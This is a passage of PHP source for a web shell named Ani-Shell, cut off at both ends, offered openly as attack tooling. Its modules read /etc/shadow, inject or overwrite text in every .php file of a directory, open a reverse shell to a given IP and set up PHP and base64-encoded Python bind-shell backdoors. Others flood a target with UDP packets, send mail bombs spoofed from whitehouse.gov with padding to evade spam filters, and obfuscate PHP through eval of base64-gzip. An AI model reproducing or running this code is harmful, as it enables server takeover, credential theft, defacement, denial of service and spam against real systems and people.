        ?>echo file_get_contents('/etc/shadow');<?php
    }
    ?></textarea><br /><br />
    <input name="submit" value="Eval That COde! :D" class="own" type="submit" />
    </form>

    <?php
    
}

// Upload

else if(isset($_GET['upload']))
{

    if (isset($_POST['file']) &&
        isset($_POST['path']) 
     )
    {
        $path = $_POST['path'];
            
        if($path[(strlen($path)-1)] != $SEPARATOR){$path = $path.$SEPARATOR;}
        
        if(is_dir($path))
        {
            $uploadedFilePath = $_FILES['file']['name'];
            $tempName = $_FILES['file']['tmp_name'];
            $uploadPath = $path .  $uploadedFilePath;
            $stat = move_uploaded_file($tempName , $uploadedFilePath);
            if ($stat)
            {
                echo "<p class='alert_green'>File uploaded to $uploadPath</p>";
            }
            else
            {
                echo "<p class='alert_red'>Failed to upload file to $uploadPath</p>";
            }
         }
    }
    else
    {
    ?>
    <table class="bind" align="center" >
    <tr>
        <th class="header" colspan="1" width="50px">Upload (From ur Computer)</th>
    </tr>
    <tr>
         <td>
            <table style="border-spacing: 6px;">
                <form method="POST" enctype="multipart/form-data">
                
                <tr>
                    <td width="100"><input type="file" name="file"/></td>
                    <td><input type="submit" name="file" class="own" value="Upload"/></td>
            
                </tr>
                
                 <tr>
                    <td colspan="2">
                        <input class='cmd' style="width: 280px;" name='path' value="<?php echo getcwd(); ?>" />   
                    </td>
                </tr>
                
                </form>
            </table>
         </td>
    </tr>
    </table>
<?php
    }

}

// Code Injector

else if(isset($_GET['injector']))
{
    if(isset($_GET['dir']) &&
    $_GET['dir'] != '' &&
    isset($_GET['filetype']) &&
    $_GET['filetype'] != '' &&
    isset($_GET['mode']) &&
    $_GET['mode'] != '' && 
    isset($_GET['message']) &&
    $_GET['message'] != '' 
    )
    {
        $dir = $_GET['dir'];
        $filetype = $_GET['filetype'];
        $message = $_GET['message'];
        
        $mode = "a"; //default mode
        
        
        // Modes Begin
        
        if($_GET['mode'] == 'Apender')
        {
            $mode = "a";
        }
        if($_GET['mode'] == 'Overwriter')
        {
            $mode = "w";
        }
        
        if($handle = opendir($dir))
        {
            ?>
            Overwritten Files :-
            <ul style="padding: 10px;" >
            <?php
            while(($file = readdir($handle)) !== False)
            {
                if((preg_match("/$filetype".'$'.'/', $file , $matches) != 0) && (preg_match('/'.$file.'$/', $self , $matches) != 1))
                {
                    ?>
                        <li class="file"><a href="<?php echo "$self?open=$dir$file"?>"><?php echo $file; ?></a></li>
                    <?php
                    echo "\n";
                    $fd = fopen($dir.$file,$mode);
		    if (!$fd) echo "<p class='alert_red'>Permission Denied</p>"; break;
                    fwrite($fd,$message);
                }
            }
            ?>
            </ul>
            <?php
        }
    }
    else
    {
        ?>
        <table id="margins" >
        <tr>
            <form method='GET'>
            <input type="hidden" name="injector"/>  
                <tr>
                    <td width="100" class="title">
                        Directory
                    </td>
                    <td>
                         <input class="cmd" name="dir" value="<?php echo getcwd().$SEPARATOR; ?>" />
                    </td>
                </tr>
                <tr>
                <td class="title">
                    Mode
                </td>
                <td>
                        <select style="width: 400px;" name="mode" class="cmd">
                            <option value="Apender">Apender</option>
                            <option value="Overwriter">Overwriter</option>
                        </select>
                </td>
                </tr>
                <tr>
                    <td class="title">
                        File Type
                    </td>
                    <td>
                        <input type="text" class="cmd" name="filetype" value=".php" onblur="if(this.value=='')this.value='.php';" />
                    </td>
                </tr>
                
                
                <tr>
                    <td colspan="2">
                        <textarea name="message" cols="110" rows="10" class="cmd">All i remember are those lonely nights when i was defacing those insecure websites!</textarea>
                    </td>
                </tr>
                
                
                <tr>
                    <td rowspan="2">
                        <input style="margin : 20px; margin-left: 390px; padding : 10px; width: 100px;" type="submit" class="own" value="Inject :D"/>
                    </td>
                </tr>
        </form>
        </table>
        <?php
    }
}

// MD5 Cracker

else if(isset($_GET['md5']))
{
    if(isset($_GET['hash']) &&
    isset($_GET['passwdList']) &&
    $_GET['hash'] != '' &&
    $_GET['passwdList'] != '')
    
    {
        echo md5Crack($_GET['hash'],$_GET['passwdList']);
    }
    else
    {
        ?>
        <table id="margins" >
        <tr>
            <form method='GET'>
                <input type="hidden" name="md5" />
                <tr>
                    <td width="100" class="title">
                        Hash
                    </td>
                    <td>
                         <input class="cmd" name="hash"/>
                    </td>
                </tr>
                <tr>
                <td class="title">
                    Password List (File Path)
                </td>
                <td>
                    <input class="cmd" name="passwdList" value="<?php echo getcwd().$SEPARATOR; ?>" />
                </td>
                </tr>
                <tr>
                <tr>
                    <td rowspan="2">
                        <input style="margin : 20px; margin-left: 390px; padding : 10px; width: 100px;" type="submit" class="own" value="Lets Crack :D"/>
                    </td>
                </tr>
        </form>
        </table>
        
        <?php
    }
}

// Google Dork Creater

else if(isset($_GET['gdork']))
{
    if(
    isset($_GET['title']) ||
    isset($_GET['text']) ||
    isset($_GET['url']) ||
    isset($_GET['site'])
    )
    {
        $title = $_GET['title'];
        $text = $_GET['text'];
        $url = $_GET['url'];
        $site = $_GET['site'];
        
        if($title != "")
        {
            $title = " intitle:\"".$title."\" ";
        }
        if($text != "")
        {
            $text = " intext:\"".$text."\" ";
        }
        if($url != "")
        {
            $url = " inurl:\"".$url."\" ";
        }
        if($site != "")
        {
            $site = " site:\"".$site."\" ";
        }
        
        // Print the output now
        ?>
        <div align="center">
        <form action="http://google.com" method="GET">
            <input class="cmd" style="border: solid red 1px;" name="q" value='<?php echo $title.$text.$url.$site ?>' /><br />
            <input type="submit" style="Padding:5px;" class="own" value='Google It! ;)' />
        </form>
        </div>
        <?php
    }
    else 
    {
    ?>
    <p align="center" style="color:red;">Note : Any one of the following options is compulsory to be filled rest can be left blank.</p>
     <table id="margins" >
        <tr>
            <form method='GET'>
                <input type="hidden" name="gdork" />
                <tr>
                    <td width="100" class="title">
                        intitle
                    </td>
                    <td>
                         <input class="cmd" name="title" value="Ani-Shell"/>
                    </td>
                </tr>
                <tr>
                <td class="title">
                    intext
                </td>
                <td>
                    <input class="cmd" name="text" value="lionaneesh" />
                </td>
                </tr>
                <tr>
                    <td width="100" class="title">
                        inurl
                    </td>
                    <td>
                         <input class="cmd" name="url" value="Ani-Shell.php"/>
                    </td>
                </tr>
                <tr>
                    <td width="100" class="title">
                        site
                    </td>
                    <td>
                         <input class="cmd" name="site" value="*.org"/>
                    </td>
                </tr>
                <tr>
                    <td rowspan="2" >
                        <input style="margin : 20px; margin-left: 390px; padding : 10px;" type="submit" class="own" value="Gimme the Dork!"/>
                    </td>
                </tr>
        </form>
        </table>
    <?php
    }
}


// Connect


else if(isset($_GET['connect']))
{
    if(isset($_POST['ip']) &&
     isset($_POST['port']) && 
        $_POST['ip'] != "" &&
        $_POST['port'] != ""
     )
    {
        echo "<p>The Program is now trying to connect!</p>";
        $ip = $_POST['ip']; 
        $port=$_POST['port']; 
        $sockfd=fsockopen($ip , $port , $errno, $errstr ); 
        if($errno != 0)
        {
            echo "<font color='red'><b>$errno</b> : $errstr</font>";
        }
        else if (!$sockfd)
        { 
               $result = "<p>Fatal : An unexpected error was occured when trying to connect!</p>";
        } 
        else
        { 
            fputs ($sockfd ,"\n=================================================================\nAni-Shell | C0d3d by lionaneesh | India\n=================================================================");
         $pwd = exec_all("pwd");
         $sysinfo = exec_all("uname -a");
         $id = exec_all("id");
         $dateAndTime = exec_all("time /t & date /T");
         $len = 1337;
         fputs($sockfd ,$sysinfo . "\n" );
         fputs($sockfd ,$pwd . "\n" );
         fputs($sockfd ,$id ."\n\n" );
         fputs($sockfd ,$dateAndTime."\n\n" );
         while(!feof($sockfd))
         {  
            $cmdPrompt ="(Ani-Shell)[$]> ";
            fputs ($sockfd , $cmdPrompt ); 
            $command= fgets($sockfd, $len);
            fputs($sockfd , "\n" . exec_all($command) . "\n\n");
        } 
        fclose($sockfd); 
        } 
    }
    else if(
    isset($_POST['port']) &&
    isset($_POST['passwd']) && 
    $_POST['port'] != "" &&
    $_POST['passwd'] != ""  &&
    isset($_POST['mode']))
    {
        $address = '127.0.0.1';
        $port = $_POST['port'];
        $pass = $_POST['passwd'];
        
        if($_POST['mode'] == "Python")
        {
            $Python_CODE = "IyBTZXJ2ZXIgIA0KIA0KaW1wb3J0IHN5cyAgDQppbXBvcnQgc29ja2V0ICANCmltcG9ydCBvcyAgDQoNCmhvc3QgPSAnJzsgIA0KU0laRSA9IDUxMjsgIA0KDQp0cnkgOiAgDQogICAgIHBvcnQgPSBzeXMuYXJndlsxXTsgIA0KDQpleGNlcHQgOiAgDQogICAgIHBvcnQgPSAzMTMzNzsgIA0KIA0KdHJ5IDogIA0KICAgICBzb2NrZmQgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVUICwgc29ja2V0LlNPQ0tfU1RSRUFNKTsgIA0KDQpleGNlcHQgc29ja2V0LmVycm9yICwgZSA6ICANCg0KICAgICBwcmludCAiRXJyb3IgaW4gY3JlYXRpbmcgc29ja2V0IDogIixlIDsgIA0KICAgICBzeXMuZXhpdCgxKTsgICANCg0Kc29ja2ZkLnNldHNvY2tvcHQoc29ja2V0LlNPTF9TT0NLRVQgLCBzb2NrZXQuU09fUkVVU0VBRERSICwgMSk7ICANCg0KdHJ5IDogIA0KICAgICBzb2NrZmQuYmluZCgoaG9zdCxwb3J0KSk7ICANCg0KZXhjZXB0IHNvY2tldC5lcnJvciAsIGUgOiAgICAgICAgDQogICAgIHByaW50ICJFcnJvciBpbiBCaW5kaW5nIDogIixlOyANCiAgICAgc3lzLmV4aXQoMSk7ICANCiANCnByaW50KCJcblxuPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09Iik7IA0KcHJpbnQoIi0tLS0tLS0tIFNlcnZlciBMaXN0ZW5pbmcgb24gUG9ydCAlZCAtLS0tLS0tLS0tLS0tLSIgJSBwb3J0KTsgIA0KcHJpbnQoIj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PVxuXG4iKTsgDQogDQp0cnkgOiAgDQogICAgIHdoaWxlIDEgOiAjIGxpc3RlbiBmb3IgY29ubmVjdGlvbnMgIA0KICAgICAgICAgc29ja2ZkLmxpc3RlbigxKTsgIA0KICAgICAgICAgY2xpZW50c29jayAsIGNsaWVudGFkZHIgPSBzb2NrZmQuYWNjZXB0KCk7ICANCiAgICAgICAgIHByaW50KCJcblxuR290IENvbm5lY3Rpb24gZnJvbSAiICsgc3RyKGNsaWVudGFkZHIpKTsgIA0KICAgICAgICAgd2hpbGUgMSA6ICANCiAgICAgICAgICAgICB0cnkgOiAgDQogICAgICAgICAgICAgICAgIGNtZCA9IGNsaWVudHNvY2sucmVjdihTSVpFKTsgIA0KICAgICAgICAgICAgIGV4Y2VwdCA6ICANCiAgICAgICAgICAgICAgICAgYnJlYWs7ICANCiAgICAgICAgICAgICBwaXBlID0gb3MucG9wZW4oY21kKTsgIA0KICAgICAgICAgICAgIHJhd091dHB1dCA9IHBpcGUucmVhZGxpbmVzKCk7ICANCiANCiAgICAgICAgICAgICBwcmludChjbWQpOyAgDQogICAgICAgICAgIA0KICAgICAgICAgICAgIGlmIGNtZCA9PSAnZzJnJzogIyBjbG9zZSB0aGUgY29ubmVjdGlvbiBhbmQgbW92ZSBvbiBmb3Igb3RoZXJzICANCiAgICAgICAgICAgICAgICAgcHJpbnQoIlxuLS0tLS0tLS0tLS1Db25uZWN0aW9uIENsb3NlZC0tLS0tLS0tLS0tLS0tLS0iKTsgIA0KICAgICAgICAgICAgICAgICBjbGllbnRzb2NrLnNodXRkb3duKCk7ICANCiAgICAgICAgICAgICAgICAgYnJlYWs7ICANCiAgICAgICAgICAgICB0cnkgOiAgDQogICAgICAgICAgICAgICAgIG91dHB1dCA9ICIiOyAgDQogICAgICAgICAgICAgICAgICMgUGFyc2UgdGhlIG91dHB1dCBmcm9tIGxpc3QgdG8gc3RyaW5nICANCiAgICAgICAgICAgICAgICAgZm9yIGRhdGEgaW4gcmF3T3V0cHV0IDogIA0KICAgICAgICAgICAgICAgICAgICAgIG91dHB1dCA9IG91dHB1dCtkYXRhOyAgDQogICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgIGNsaWVudHNvY2suc2VuZCgiQ29tbWFuZCBPdXRwdXQgOi0gXG4iK291dHB1dCsiXHJcbiIpOyAgDQogICAgICAgICAgICAgICANCiAgICAgICAgICAgICBleGNlcHQgc29ja2V0LmVycm9yICwgZSA6ICANCiAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgcHJpbnQoIlxuLS0tLS0tLS0tLS1Db25uZWN0aW9uIENsb3NlZC0tLS0tLS0tIik7ICANCiAgICAgICAgICAgICAgICAgY2xpZW50c29jay5jbG9zZSgpOyAgDQogICAgICAgICAgICAgICAgIGJyZWFrOyAgDQpleGNlcHQgIEtleWJvYXJkSW50ZXJydXB0IDogIA0KIA0KDQogICAgIHByaW50KCJcblxuPj4+PiBTZXJ2ZXIgVGVybWluYXRlZCA8PDw8PFxuIik7ICANCiAgICAgcHJpbnQoIj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09Iik7IA0KICAgICBwcmludCgiXHRUaGFua3MgZm9yIHVzaW5nIEFuaS1zaGVsbCdzIC0tIFNpbXBsZSAtLS0gQ01EIik7ICANCiAgICAgcHJpbnQoIlx0RW1haWwgOiBsaW9uYW5lZXNoQGdtYWlsLmNvbSIpOyAgDQogICAgIHByaW50KCI9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0iKTsNCg==";

            $fd = fopen("bind.py","w");

            if($fd != FALSE)
            {
                fwrite($fd,base64_decode($Python_CODE));
                
                if($os == "Linux")
                {
                    echo "[+] OS Detected = Windows";
                    exec_all("chmod +x bind.py ; ./bind.py");
                    
                    // CHeck if the process is running
            
                    $pattern = "bind.py";
            
                    $list = exec_all("ps -aux");
                }
                else
                {
                    echo "[+] OS Detected = Windows";
                    exec_all("start bind.py");
                    // CHeck if the process is running
            
                    $pattern = "python.exe";
            
                    $list = exec_all("TASKLIST");
                }
                
                
                if(preg_match("/$pattern/",$list))
                {
                        echo "<p class='alert_green'>Process Found Running! Backdoor Setuped Successfully! :D</p>";
                }
                else
                {
                    echo "<p class='alert_red'>Process Not Found Running! Backdoor Setup FAILED :(</p>";
                }
                
                echo "<br /><br />\n<b>Task List :-</b> <pre>\n$list</pre>";
                
            }
        }
    }
    else if($_POST['mode'] == "PHP")
    {
            
        // Set time limit to indefinite execution
        set_time_limit (0);
        
        
        // Set the ip and port we will listen on
        

        if(function_exists("socket_create"))
        {
        // Create a TCP Stream socket
        $sockfd = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);

      
        // Bind the socket to an address/port
        
        
        if(socket_bind($sockfd, $address, $port) == FALSE)
        {
            echo "Cant Bind to the specified port and address!";
        }
        // Start listening for connections
        socket_listen($sockfd,15);
        
    
        $passwordPrompt = "\n=================================================================\nAni-Shell | C0d3d by lionaneesh | India\n=================================================================\n\n0xPassword : ";
        
        /* Accept incoming requests and handle them as child processes */
        $client = socket_accept($sockfd);
        

        socket_write($client , $passwordPrompt);
        // Read the pass from the client
        $input = socket_read($client, strlen($pass) + 2); // +2 for \r\n
        if(trim($input) == $pass)
        {
            socket_write($client , "\n\n");
            socket_write($client , ($os == "Windows") ? exec_all("date /t & time /t")  . "\n" . exec_all("ver") : exec_all("date") . "\n" . exec_all("uname -a"));
            socket_write($client , "\n\n");
            while(1)
            {
                // Print Command prompt
                $commandPrompt ="(Ani-Shell)[$]> ";
                $maxCmdLen = 31337;
                socket_write($client,$commandPrompt);
                $cmd = socket_read($client,$maxCmdLen);
                if($cmd == FALSE)
                {
                    echo "The client Closed the conection!";
                    break;
                }
                socket_write($client , exec_all($cmd));
            }
        }
        else
        {
            echo "Wrong Password!";
            socket_write($client, "sU(|< - 0FF Bitch!\n\n");
        }
        socket_shutdown($client, 2);
        socket_close($socket);
        
        // Close the client (child) socket
        //socket_close($client);
        // Close the master sockets
        //socket_close($sock);
        }
        else
        {
            echo "Socket Conections not Allowed/Supported by the server! <br />";
        }
    }
    else
    {
    ?>       
    <table class="bind" align="center" >
    <tr>
        <th class="header" colspan="1" width="50px">Back Connect</th>
        <th class="header" colspan="1" width="50px">Bind Shell</th>
    </tr>
    <tr>
        <form method='POST' >  
         <td>
            <table style="border-spacing: 6px;">
                <tr>
                    <td>IP </td>
                    <td>
                        <input style="width: 200px;" class="cmd" name="ip" value="<?php getClientIp();?>" />
                    </td>
                </tr>
                <tr>
                    <td>Port </td>
                    <td><input style="width: 100px;" class="cmd" name="port" size='5' value="31337"/></td>
                </tr>
                <tr>
                <td>Mode </td>    
                <td>
                        <select name="mode" class="cmd">
                            <option value="PHP">PHP</option>
                        </select>&nbsp;&nbsp;<input style="width: 90px;" class="own" type="submit" value="Connect!"/></td>
                
            </table>
         </td>
         </form> 
         <form method="POST">
         <td>
            <table style="border-spacing: 6px;">
                <tr>
                    <td>Port</td>
                    <td>
                        <input style="width: 200px;" class="cmd" name="port" value="31337" />
                    </td>
                </tr>
                <tr>
                    <td>Passwd </td>
                    <td><input style="width: 100px;" class="cmd" name="passwd" size='5' value="lionaneesh"/>
                </tr>
                <tr>
                <td>
                Mode
                </td>
                <td>
                        <select name="mode" class="cmd">
                            <option value="PHP">PHP</option>
                            <option value="Python">Python</option>
                        </select> &nbsp;&nbsp;<input style="width: 90px;" class="own" type="submit" value="Bind :D!"/></td>
                </tr>    
                   
            </table>
         </td>
         </form>
    </tr>
    </table>
    <p align="center" style="color: red;" >Note : After clicking Submit button , The browser will start loading continuously , Dont close this window , Unless you are done!</p>
<?php
    }
}

//fuzzer

else if(isset($_GET['fuzz']))
{
    if(isset($_GET['ip']) &&
    isset($_GET['port']) &&
    isset($_GET['times']) &&
    isset($_GET['time']) &&
    isset($_GET['message']) &&
    isset($_GET['messageMultiplier']) &&
    $_GET['message'] != "" &&
    $_GET['time'] != "" &&
    $_GET['times'] != "" &&
    $_GET['port'] != "" &&
    $_GET['ip'] != "" &&
    $_GET['messageMultiplier'] != ""
    )
    {
       $IP=$_GET['ip'];
	   $port=$_GET['port'];
       $times = $_GET['times'];
	   $timeout = $_GET['time'];
	   $send = 0;
       $ending = "";
       $multiplier = $_GET['messageMultiplier'];
       $data = "";
       $mode="tcp";
       $data .= "GET /";
       $ending .= " HTTP/1.1\n\r\n\r\n\r\n\r";
        if($_GET['type'] == "tcp")
        {
            $mode = "tcp";
        }
        while($multiplier--)
        {
            $data .= urlencode($_GET['message']);
        }
        $data .= "%s%s%s%s%d%x%c%n%n%n%n";// add some format string specifiers
        $data .= "by-Ani-shell".$ending;
        $length = strlen($data);
        
        
       echo "Sending Data :- <br /> <p align='center'>$data</p>";
        
       print "I am at ma Work now :D ;D! Dont close this window untill you recieve a message <br>";
	   for($i=0;$i<$times;$i++)
	   {
            $socket = fsockopen("$mode://$IP", $port, $error, $errorString, $timeout);
            if($socket)
            {
                fwrite($socket , $data , $length );
                fclose($socket);
            }
        }
        echo "<script>alert('Fuzzing Completed!');</script>";
        echo "DOS attack against $mode://$IP:$port completed on ".date("h:i:s A")."<br />";
        echo "Total Number of Packets Sent : " . $times . "<br />";
        echo "Total Data Sent = ". HumanReadableFilesize($times*$length) . "<br />"; 
        echo "Data per packet = " . HumanReadableFilesize($length) . "<br />";
    }
    else
    {
        ?>
        <form method="GET">
            <input type="hidden" name="fuzz" />
            <table id="margins">
                <tr>
                    <td width="400" class="title">
                        IP
                    </td>
                    <td>
                        <input class="cmd" name="ip" value="127.0.0.1" onfocus="if(this.value == '127.0.0.1')this.value = '';" onblur="if(this.value=='')this.value='127.0.0.1';"/>
                    </td>
                </tr>
                
                <tr>
                    <td class="title">
                        Port
                    </td>
                    <td>
                        <input class="cmd" name="port" value="80" onfocus="if(this.value == '80')this.value = '';" onblur="if(this.value=='')this.value='80';"/>
                    </td>
                </tr>
                
                <tr>
                    <td class="title">
                        Timeout
                    </td>
                    <td>
                        <input type="text" class="cmd" name="time" value="5" onfocus="if(this.value == '5')this.value = '';" onblur="if(this.value=='')this.value='5';"/>
                    </td>
                </tr>
                
                
                <tr>
                    <td class="title">
                        No of times
                    </td>
                    <td>
                        <input type="text" class="cmd" name="times" value="100" onfocus="if(this.value == '100')this.value = '';" onblur="if(this.value=='')this.value='100';" />
                    </td>
                </tr>
                
                <tr>
                    <td class="title">
                        Message <font color="red">(The message Should be long and it will be multiplied with the value after it)</font>
                    </td>
                    <td>
                        <input class="cmd" name="message" value="%S%x--Some Garbage here --%x%S" onfocus="if(this.value == '%S%x--Some Garbage here --%x%S')this.value = '';" onblur="if(this.value=='')this.value='%S%x--Some Garbage here --%x%S';"/>
                    </td>
                    <td>
                        x
                    </td>
                    <td width="20">
                        <input style="width: 30px;" class="cmd" name="messageMultiplier" value="10" />
                    </td>
                </tr>
                
                <tr>
                    <td rowspan="2">
                        <input style="margin : 20px; margin-left: 500px; padding : 10px; width: 100px;" type="submit" class="own" value="Let it Rip! :D"/>
                    </td>
                </tr>
            </table>            
        </form>
        <?php
    }
}


//DDos

else if(isset($_GET['dos']))
{
    if(isset($_GET['ip']) &&
    isset($_GET['exTime']) &&
    isset($_GET['port']) &&
    isset($_GET['timeout']) &&
    $_GET['exTime'] != "" &&
    $_GET['port'] != "" &&
    $_GET['ip'] != "" &&
    $_GET['timeout'] != ""
    )
    {
       $IP=$_GET['ip'];
	   $port=$_GET['port'];
       $executionTime = $_GET['exTime'];
	   $noOfBytes = $_GET['noOfBytes'];
       $data = "";
       $timeout = $_GET['timeout'];
       $packets = 0;
       $counter = $noOfBytes;
       $maxTime = time() + $executionTime;;
       while($counter--)
       {
            $data .= "X";
       }
       $data .= "-by-Ani-Shell"; 
       print "I am at ma Work now :D ;D! Dont close this window untill you recieve a message <br>";
	   
       while(1)
	   {
            $socket = fsockopen("udp://$IP", $port, $error, $errorString, $timeout);
            if($socket)
            {
                fwrite($socket , $data);
                fclose($socket);
                $packets++;
            }
            if(time() >= $maxTime)
            {
                break;
            }
        }
        echo "<script>alert('DDos Completed!');</script>";
        echo "DOS attack against udp://$IP:$port completed on ".date("h:i:s A")."<br />";
        echo "Total Number of Packets Sent : " . $packets . "<br />";
        echo "Total Data Sent = ". HumanReadableFilesize($packets*$noOfBytes) . "<br />"; 
        echo "Data per packet = " . HumanReadableFilesize($noOfBytes) . "<br />";
    }
    else
    {

        ?>
        <form method="GET">
            <input type="hidden" name="dos" />
            <table id="margins">
                <tr>
                    <td width="400" class="title">
                        IP
                    </td>
                    <td>
                        <input class="cmd" name="ip" value="127.0.0.1" onfocus="if(this.value == '127.0.0.1')this.value = '';" onblur="if(this.value=='')this.value='127.0.0.1';"/>
                    </td>
                </tr>
                
                <tr>
                    <td class="title">
                        Port
                    </td>
                    <td>
                        <input class="cmd" name="port" value="80" onfocus="if(this.value == '80')this.value = '';" onblur="if(this.value=='')this.value='80';"/>
                    </td>
                </tr>
                
                <tr>
                    <td class="title">
                        Timeout <font color="red">(Time in seconds)</font>
                    </td>
                    <td>
                        <input type="text" class="cmd" name="timeout" value="5" onfocus="if(this.value == '5')this.value = '';" onblur="if(this.value=='')this.value='5';" />
                    </td>
                </tr>
                
                
                <tr>
                    <td class="title">
                        Execution Time <font color="red">(Time in seconds)</font> 
                    </td>
                    <td>
                        <input type="text" class="cmd" name="exTime" value="10" onfocus="if(this.value == '10')this.value = '';" onblur="if(this.value=='')this.value='10';"/>
                    </td>
                </tr>
                
                <tr>
                    <td class="title">
                        No of Bytes per/packet
                    </td>
                    <td>
                        <input type="text" class="cmd" name="noOfBytes" value="999999" onfocus="if(this.value == '999999')this.value = '';" onblur="if(this.value=='')this.value='999999';"/>
                    </td>
                </tr>
                

                <tr>
                    <td rowspan="2">
                        <input style="margin : 20px; margin-left: 500px; padding : 10px; width: 100px;" type="submit" class="own" value="Let it Rip! :D"/>
                    </td>
                </tr>
            </table>            
        </form>
        <?php
    }
}

// Mail Bomber

else if(isset($_GET['bomb']))
{
    if(
        isset($_GET['to']) &&
        isset($_GET['subject']) &&
        isset($_GET['message']) &&
        isset($_GET['times']) &&
        $_GET['to'] != '' &&
        $_GET['subject'] != '' &&
        $_GET['message'] != '' &&
        $_GET['times'] != ''
    )
    {
        $times = $_GET['times'];
        while($times--)
        {
            if(isset($_GET['padding']))
            {
                $fromPadd = rand(0,9999);
                $subjectPadd = " -- ID : ".rand(0,9999999);
                $messagePadd = "\n\n------------------------------\n".rand(0,99999999);
                
            }
            $from = "president$fromPadd@whitehouse.gov";
            if(!mail($_GET['to'],$_GET['subject'].$subjectPadd,$_GET['message'].$messagePadd,"From:".$from))
            {
                $error = 1;
                echo "<p class='alert_red'>Some Error Occured!</p>";
                break;
            }
        }
        if($error != 1)
        {
            echo "<p class='alert_green'>Mail(s) Sent!</p>";
        }
    }
    else
    {
        ?>
        <form method="GET">
            <input type="hidden" name="bomb" />
            <table id="margins">
                <tr>
                    <td class="title">
                        To 
                    </td>
                    <td>
                        <input class="cmd" name="to" value="victim@domain.com,victim2@domain.com" onfocus="if(this.value == 'victim@domain.com,victim2@domain.com')this.value = '';" onblur="if(this.value=='')this.value='victim@domain.com,victim2@domain.com';"/>
                    </td>
                </tr>
                
                <tr>
                    <td class="title">
                        Subject
                    </td>
                    <td>
                        <input type="text" class="cmd" name="subject" value="Just testing my Fucking Skillz!" onfocus="if(this.value == 'Just testing my Fucking Skillz!')this.value = '';" onblur="if(this.value=='')this.value='Just testing my Fucking Skillz!';" />
                    </td>
                </tr>
                 <tr>
                    <td class="title">
                        No. of Times  
                    </td>
                    <td>
                        <input class="cmd" name="times" value="100" onfocus="if(this.value == '100')this.value = '';" onblur="if(this.value=='')this.value='100';"/>
                    </td>
                </tr>
       
                <tr>
                    <td>
                        
                        Pad your message (Less spam detection)
                        
                    </td>
                    <td>
                    
                        <input type="checkbox" name="padding"/>
                          
                    </td>
                </tr>
                <tr>
                    <td colspan="2">
                        <textarea name="message" cols="110" rows="10" class="cmd">Ani-Shell Rocks!!</textarea>
                    </td>
                </tr>
                
                
                <tr>
                    <td rowspan="2">
                        <input style="margin : 20px; margin-left: 390px; padding : 10px; width: 100px;" type="submit" class="own" value="Send! :D"/>
                    </td>
                </tr>
            </table>            
        </form>   
        <?php
    }
}

//Mass Mailer

else if(isset($_GET['mail']))
{
    if(
        isset($_GET['to']) &&
        isset($_GET['from']) &&
        isset($_GET['subject']) &&
        isset($_GET['message'])
    )
    {

        if(mail($_GET['to'],$_GET['subject'],$_GET['message'],"From:".$_GET['from']))
        {
            echo "<p class='alert_green'>Mail Sent!</p>";
        }
        else
        {
            echo "<p class='alert_red'>Some Error Occured!</p>";
        }
    }
    else
    {
        ?>
        <form method="GET">
            <input type="hidden" name="mail" />
            <table id="margins">
                <tr>
                    <td width="100" class="title">
                        From
                    </td>
                    <td>
                        <input class="cmd" name="from" value="president@whitehouse.gov" onfocus="if(this.value == 'president@whitehouse.gov')this.value = '';" onblur="if(this.value=='')this.value='president@whitehouse.gov';"/>
                    </td>
                </tr>
                
                <tr>
                    <td class="title">
                        To 
                    </td>
                    <td>
                        <input class="cmd" name="to" value="victim@domain.com,victim2@domain.com" onfocus="if(this.value == 'victim@domain.com,victim2@domain.com')this.value = '';" onblur="if(this.value=='')this.value='victim@domain.com,victim2@domain.com';"/>
                    </td>
                </tr>
                
                <tr>
                    <td class="title">
                        Subject
                    </td>
                    <td>
                        <input type="text" class="cmd" name="subject" value="Just testing my Fucking Skillz!" onfocus="if(this.value == 'Just testing my Fucking Skillz!')this.value = '';" onblur="if(this.value=='')this.value='Just testing my Fucking Skillz!';" />
                    </td>
                </tr>
                
                
                <tr>
                    <td colspan="2">
                        <textarea name="message" cols="110" rows="10" class="cmd">All i remember are those lonely nights when i was defacing those insecure websites!</textarea>
                    </td>
                </tr>
                
                
                <tr>
                    <td rowspan="2">
                        <input style="margin : 20px; margin-left: 390px; padding : 10px; width: 100px;" type="submit" class="own" value="Send! :D"/>
                    </td>
                </tr>
            </table>            
        </form>   
        <?php
    }
}


// Edit File

else if(isset($_POST['file']) &&
        isset($_POST['content']) )
{
    if(is_dir($_POST['file']))
    {
        header("location:".$self."?dir=".$_POST['file']);
    }
    if(file_exists($_POST['file']))
    {
        $handle = fopen($_POST['file'],"w");
	if (!handle) echo "<p class='alert_red'>Permission Denied</p>";
	else {
        	fwrite($handle,$_POST['content']);
        	echo "Your changes were Successfully Saved!";
        }
    }
    else
    {
        echo "<p class='alert_red'>File Name Specified does not exists!</p>";
    }
}

// PHP Obfuscator

else if(isset($_GET['obfuscate']))
{
    if ( isset($_POST['code']) &&
               $_POST['code'] != '')
    {
        $encoded = base64_encode(gzdeflate(trim(stripslashes($_POST['code'].' '),'<?php,?>'),9)); // high Compression! :P
        $encode = '
<?php
$encoded = \''.$encoded.'\';
eval(gzinflate(base64_decode($encoded)));
// Script Encoded by Ani-Shell 
?>
';
    }
    else
    {
        $encode = 'Please Enter your Code! and Click Submit! :)';    
    }?>
    <form method="POST">
        <textarea class="cmd" cols="100" rows="20" name="code"><?php echo $encode;?></textarea><br />
        <input style="margin: 20px; margin-left: 50px; padding: 10px;"  class="own"  type="submit" value="Encode :D"/>
    </form>
    
    <?php
}

//open file

else if(isset($_GET['open']))
{
    ?>
	</center>
        <form method="POST" action="<?php echo $self;?>" >
        <table>
            <tr>
                <td>File </td><td> : </td><td><input value="<?php echo $_GET['open'];?>" class="cmd" name="file" /></td>
            </tr>
            <tr>
                <td>Size </td><td> : </td><td><input value="<?php echo filesize($_GET['open']);?>" class="cmd" /></td> 
            </tr>
        </table>
        <textarea name="content" rows="20" cols="60" class="cmd"><?php
        $content = htmlspecialchars(file_get_contents($_GET['open']));
        if($content)
        {
            echo $content;
        }
